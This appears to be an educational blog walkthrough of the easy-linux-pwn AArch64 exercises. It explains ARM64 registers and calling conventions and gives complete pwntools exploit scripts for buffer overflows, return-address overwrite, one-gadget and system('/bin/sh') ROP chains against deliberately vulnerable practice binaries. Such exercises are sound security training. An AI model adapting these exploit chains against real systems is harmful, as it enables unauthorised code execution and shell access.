---
title: 'AArch64 Binary Exploitation: easy_linux_pwn'
date: 2020-01-01T00:00:00.000Z
excerpt: 'A hands-on ARM64 exploitation walkthrough covering the AArch64 calling convention, stack layout differences from x86-64, and ROP chain construction'
tags:
  - aarch64
  - arm64
  - pwn
  - rop
  - binary-exploitation
  - linux
categories:
  - Research
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Introduction

While looking for AArch64 binary exploitation examples, I came across the [easy-linux-pwn](https://github.com/xairy/easy-linux-pwn.git) repository. It collects a variety of small exploitation exercises organized by architecture.

![easy-linux-pwn repository overview](/images/blog/aarch64-easy-linux-pwn/Untitled.png)

This post works through the ARM64 challenges while also covering the AArch64 architecture fundamentals you need in order to understand how exploitation differs from x86-64.

## AArch64 Architecture Fundamentals

### Registers

AArch64 provides 31 general-purpose registers. There are `X0`~`X30` (64-bit), along with the `W0`~`W30` aliases that access the lower 32 bits of each.

### PSTATE

PSTATE provides Processor STATE information. It consists of attributes specific to AArch64/AArch32 plus attributes common to both modes, and it does not map 1:1 to the CPSR of ARMv7.

### Special-Purpose Registers

Beyond the general-purpose registers, AArch64 provides several special-purpose registers.

![AArch64 special-purpose registers](/images/blog/aarch64-easy-linux-pwn/Untitled-1.png)

### ELR (Exception Link Register)

ELR is the register that stores the execution location to return to when returning from an exception. The processor copies the ELR value corresponding to the current Exception Level into the PC. It exists for each exception level except EL0, which has nothing to return to, and its name is `ELR_EL[n]`.

### SPSR (Saved Program Status Register)

SPSR is the register that saves the processor state at a specific moment. When an exception occurs, the processor saves the current state from PSTATE into SPSR, and when returning from the exception it restores it from SPSR back into PSTATE. Like ELR, it exists for each exception level except EL0, and its name is `SPSR_EL[n]`.

### XZR / WZR

ZR is the zero register. When used as a source it reads as 0, and when used as a destination the result is discarded. `XZR` is the 64-bit form and `WZR` is the 32-bit form.

### SP / WSP

SP is the register that points to the current position of the stack. It exists for each exception level including EL0, and its name is `SP_EL[n]`. `WSP` is the 32-bit stack pointer.

One peculiarity is that at exception levels other than EL0, you can choose either that level's `SP_EL[n]` or `SP_EL0` to use as the stack pointer.

### System Registers

In AArch64, system configuration is controlled through system registers, accessed with the `MSR` and `MRS` instructions. Because AArch64 does not support a co-processor, it does not provide a cp15-operation-style interface like ARMv7. The number at the end of a system register name indicates the lowest exception level that can access it.

Example of reading the value of the `TTBR0_EL1` register into `x0`:

```c
MRS x0, TTBR0_EL1
```

Conversely, writing the `x0` value into `TTBR0_EL1`:

```c
MSR TTBR0_EL1, x0
```

## ABI: Register Usage Convention

Every architecture has rules that allow binaries to interoperate, which is called the ABI (Application Binary Interface). For AArch64, this is defined by **AAPCS64** (Procedure Call Standard for the ARM 64-bit Architecture), which covers the interface between assembly and C as well as the function calling convention.

![AAPCS64 register roles](/images/blog/aarch64-easy-linux-pwn/Untitled-2.png)

| Register | Role |
|----------|------|
| X0~X7 | Store parameters and return values; the function return value is stored in X0 |
| X8 | Indirect result location register (used to pass the address of a large return value) |
| X9~X15 | Caller-saved temporary registers (the caller saves them to its own stack if needed) |
| X16~X17 | Intra-procedure-call scratch registers (IP0, IP1) |
| X18 | Platform register |
| X19~X28 | Callee-saved registers (the callee is obligated to preserve them) |
| X29 | Frame Pointer (FP) |
| X30 | Procedure Link Register (LR) |

The key difference from x86-64: **the return address is stored in LR (X30)**. This differs from x86-64, where the `call` instruction pushes the return address onto the stack. X30 is only saved to the stack in the function prologue when the function makes further calls.

---

## Solving the Challenges

### 00-hello-pwn

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/bin/sh");
    return EXIT_SUCCESS;
}
```

Just run it and you're done. You could call it the goal state of every pwn challenge.

```
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
```

### 01-local-overflow

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct frame {
    char buffer[128];
    unsigned long x;
};

int main(int argc, char** argv) {
    struct frame f;
    memset(&f, 0, sizeof(f));

    printf("> ");
    fflush(stdout);

    read(STDIN_FILENO, &f.buffer[0], 256);

    printf("x = %lx\n", f.x);
    if (f.x == (unsigned long)0xdeadbabebeefc0deUL) {
        printf("launching shell...\n");
        system("/bin/sh");
    }

    return EXIT_SUCCESS;
}
```

Putting `0xdeadbabebeefc0de` into the struct member `x` is the win. Since `x` is located right after `buffer[128]` in the struct, all you have to do is pad 128 bytes and then append the desired value.

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/01-local-overflow'

p = process(binary_path)

payload = ''
payload += "A"*128
payload += p64(0xdeadbabebeefc0de)

p.readuntil('> ')
p.write(payload)
p.interactive()
```

### 02-overwrite-ret

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void not_called() {
    printf("launching shell...\n");
    system("/bin/sh");
}

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 256);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

The goal is to redirect execution flow to `not_called`. On x86-64, `call` pushes the return address onto the stack and `ret` pops it into RIP. AArch64 does it differently.

Let's hand-trace the assembly to work out the stack layout.

**Disassembly of the main function:**

```
0x0000000000400724 <+0>:   stp  x29, x30, [sp, #-32]!
0x0000000000400728 <+4>:   mov  x29, sp
0x000000000040072c <+8>:   str  w0, [x29, #28]
0x0000000000400730 <+12>:  str  x1, [x29, #16]
0x0000000000400734 <+16>:  bl   0x4006e0 <vulnerable>
0x0000000000400738 <+20>:  mov  w0, #0x0
0x000000000040073c <+24>:  ldp  x29, x30, [sp], #32
0x0000000000400740 <+28>:  ret
```

Step-by-step analysis:
1. `stp x29, x30, [sp, #-32]!` - save x29 (FP) and x30 (LR) at `[sp]` and `[sp+8]`, then `sp -= 32` (function prologue)
2. `mov x29, sp` - set the frame pointer
3. `str w0, [x29, #28]` - save argc
4. `str x1, [x29, #16]` - save argv
5. `bl 0x4006e0` - branch-and-link to `vulnerable`; store the return address (`0x400738`) in x30 (LR)
6. `mov w0, #0x0` - set the return value
7. `ldp x29, x30, [sp], #32` - restore x29 and x30 from the stack, then `sp += 32`
8. `ret` - jump to x30

**Disassembly of the vulnerable function:**

```
0x00000000004006e0 <+0>:   stp  x29, x30, [sp, #-144]!
0x00000000004006e4 <+4>:   mov  x29, sp
0x00000000004006e8 <+8>:   adrp x0, 0x400000
0x00000000004006ec <+12>:  add  x0, x0, #0x818
0x00000000004006f0 <+16>:  bl   0x4005a0 <printf@plt>
0x00000000004006f4 <+20>:  adrp x0, 0x410000
0x00000000004006f8 <+24>:  ldr  x0, [x0, #4056]
0x00000000004006fc <+28>:  ldr  x0, [x0]
0x0000000000400700 <+32>:  bl   0x400580 <fflush@plt>
0x0000000000400704 <+36>:  add  x0, x29, #0x10
0x0000000000400708 <+40>:  mov  x2, #0x100
0x000000000040070c <+44>:  mov  x1, x0
0x0000000000400710 <+48>:  mov  w0, #0x0
0x0000000000400714 <+52>:  bl   0x400590 <read@plt>
0x0000000000400718 <+56>:  nop
0x000000000040071c <+60>:  ldp  x29, x30, [sp], #144
0x0000000000400720 <+64>:  ret
```

Key observations:
- `stp x29, x30, [sp, #-144]!` - save x29 and x30 at the top of a 144-byte stack frame
- `add x0, x29, #0x10` - `buffer` is located at `x29 + 0x10`
- `read(0, buffer, 0x100)` - reads 256 bytes into a 128-byte buffer (overflow possible)
- the epilogue `ldp x29, x30, [sp], #144` restores x29 and x30 from the stack, then `ret` jumps to x30

Key insight: **the saved x30 (LR) is located at `sp + 8` in the vulnerable frame** (right after the saved x29). The buffer starts at `x29 + 0x10`.

Computing the offset from `buffer` to the saved x30:

```
saved_x30: sp + 8
buffer:    x29 + 0x10 = sp + 0x10  (x29 == sp after the prologue)
```

Based on the actual addresses obtained from the debugger:

```python
saved_x30_addr = 0x4000800340 + 8  # main's stp x29, x30, [sp, #-32]!
buffer_addr    = 0x40008002c0
```

The offset is `saved_x30_addr - buffer_addr`.

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/02-overwrite-ret'
binary = ELF(binary_path)

not_called_addr = binary.symbols['not_called']
saved_x30_addr  = 0x4000800340 + 8
buffer_addr     = 0x40008002c0

p = process(binary_path)

payload = ''
payload += "A" * (saved_x30_addr - buffer_addr)
payload += p64(not_called_addr)
p.readuntil('> ')
p.write(payload)
p.interactive()
```

The x30 register plays a role similar to x86's `push ebp`. By computing the distance between `buffer` and the saved x30, you learn the full stack frame size excluding the buffer offset.

### 03-one-gadget

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 256);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

This challenge is an exploit that uses a one-shot gadget (one-gadget). The structure is the same buffer overflow, and all you need to do is find a single libc gadget that calls `execl("/bin/sh", ...)`.

Let's lay out the stack visually. Printing `$sp` right after `read` in the `vulnerable` function:

![vulnerable's stack layout after read](/images/blog/aarch64-easy-linux-pwn/Untitled-3.png)

- Green (bottom): x29, x30 saved by main's function prologue
- Red: `buffer[128]`
- Yellow: x29, x30 saved by the vulnerable function prologue

The range we can overwrite: `buffer` and main's saved x30 (LR).

The epilogue sequence:

```
0x0000000000400670 <+60>:  ldp  x29, x30, [sp], #144
0x0000000000400674 <+64>:  ret
```

After `vulnerable` returns, main's epilogue:

```
0x0000000000400738 <+20>:  mov  w0, #0x0
0x000000000040073c <+24>:  ldp  x29, x30, [sp], #32
0x0000000000400740 <+28>:  ret
```

This second epilogue loads x29 and x30 from the stack and then jumps to x30. We just need to put our desired gadget address into x30.

The one-gadget calls `execl("/bin/sh", x1)`. For it to work, x1 must be NULL:

![one-gadget target](/images/blog/aarch64-easy-linux-pwn/Untitled-8.png)

We need a gadget that loads x1 with our desired value and provides a second redirect:

```
0x2c490 : ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0 x1; ret;
```

This gadget loads x1 from `[x29 + 0x18]` and loads a new x30 from the stack.

**Payload layout:**

```
| buffer[128] | zero_addr - 0x18 | ldr_x1_x30_ret | "B"x16 | p64(0) | execl_gadget |
|             |      x29         |      x30        | dummy  |   x29  |      x30     |
```

After filling the buffer:
1. Set x29 to `zero_addr - 0x18` so that `ldr x1, [x29, #0x18]` loads from `zero_addr` (x1 = 0)
2. Set x30 to the `ldr_x1_x30_ret` gadget
3. After that gadget, x30 becomes the one-gadget address

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/03-one-gadget'
libc_path   = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

binary = ELF(binary_path)
libc   = ELF(libc_path)
p      = process(binary_path)

libc_base                = 0x0000004000846000
saved_x30_addr           = 0x4000800340 + 8
buffer_addr              = 0x40008002c0
one_gadget_addr          = libc_base + 0x63e80      # execl("/bin/sh", x1=NULL)
ldr_x1_x30_ret_gadget    = libc_base + 0x2c490      # ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0 x1; ret

bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
zero_addr   = libc_base + libc.search(p64(0)).next()

payload  = ''
payload += "A" * (saved_x30_addr - buffer_addr - 8)
payload += p64(zero_addr - 0x18)       # x29: ldr x1, [x29, #0x18] loads from zero_addr
payload += p64(ldr_x1_x30_ret_gadget)  # x30: jump to the ldr gadget
payload += "B" * 16                    # dummy
payload += p64(0)                      # x29 (next frame)
payload += p64(one_gadget_addr)        # x30: one-gadget

p.readuntil('> ')
p.write(payload)
p.interactive()
```

### 06-system-rop

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 512);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

The same overflow, but this time we solve it with a classic ROP chain that calls `system("/bin/sh")`.

Goal: set `x0 = &"/bin/sh"` and then call `system`. On x86-64 you'd typically chain a `pop rdi; ret` gadget. On AArch64 you use `ldp` to load several registers at once.

The two gadgets found in libc:

```
ldp_x24_x25_x30_ret: ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret
mov_x0_x24_blr_x25:  mov x0, x24; blr x25;
```

**Chain flow:**
1. Jump to `ldp_x24_x25_x30_ret` - load x24, x25 from `[sp + 0x38]` and load a new x30 from the stack
2. Set x30 to `mov_x0_x24_blr_x25` - this is where `ret` lands
3. `mov_x0_x24_blr_x25` sets x0 to x24 (`&"/bin/sh"`) and calls x25 (`system`)

**Payload layout:**

```
| buffer + dummy | ldp_x24_x25_x30_ret | dummy[16] | p64(0) | mov_x0_x24_blr_x25 | dummy(0x38-16) | &/bin/sh | system |
```

```python
import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/06-system-rop'
libc_path   = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

saved_x30_addr = 0x4000800340 + 8
buffer_addr    = 0x40008002c0
libc_addr      = 0x0000004000846000

ldp_x24_x25_x30_ret_addr = libc_addr + 0x00036edc  # ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret
mov_x0_x24_blr_x25_addr  = libc_addr + 0x000ce2ec  # mov x0, x24; blr x25;

libc       = ELF(libc_path)
system_addr  = libc_addr + libc.symbols['system']
bin_sh_addr  = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)

payload  = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(ldp_x24_x25_x30_ret_addr)  # x30: land here first
payload += 'b' * 16                        # dummy
payload += p64(0)                          # x29
payload += p64(mov_x0_x24_blr_x25_addr)   # x30: destination of the next ret
payload += 'c' * (0x38 - 16)              # pad up to sp+0x38
payload += p64(bin_sh_addr)               # x24 -> "/bin/sh"
payload += p64(system_addr)               # x25 -> system

p.readuntil('> ')
p.write(payload)
p.interactive()
```

---

## Stack Layout: AArch64 vs x86-64

The key differences that confuse someone from an x86-64 exploitation background the most when they first encounter AArch64:

| Item | x86-64 | AArch64 |
|------|--------|---------|
| Return address storage | `call` automatically pushes RIP onto the stack | `bl` writes the return address into X30 (LR) |
| When it's saved to the stack | only when there are nested calls | always saves FP and LR together via the prologue `stp x29, x30, [sp, #-N]!` |
| ret instruction | pops RIP from the stack | jumps to X30 |
| Overflow target | directly overwrite the return address on the stack | overwrite the saved X30 at a known stack offset |
| Gadget chaining | `pop rdi; ret` style | `ldp x0, x1, [sp], #N; ret` style - one gadget handles multiple registers |

The debugging approach shown in challenge 03 is essential for AArch64 exploitation. You attach GDB by adding the `-g` flag to `qemu-aarch64-static`, and you have to directly observe how the `ldp` epilogue shuffles registers before the final `ret`.

```bash
qemu-aarch64-static -L /usr/aarch64-linux-gnu -g 1234 ./bin/arm64/03-one-gadget <<< $(perl -e 'print "A"x128, "B"x8, "C"x8')
```

This makes the stack frame transitions visible and removes the guesswork from offset calculations.
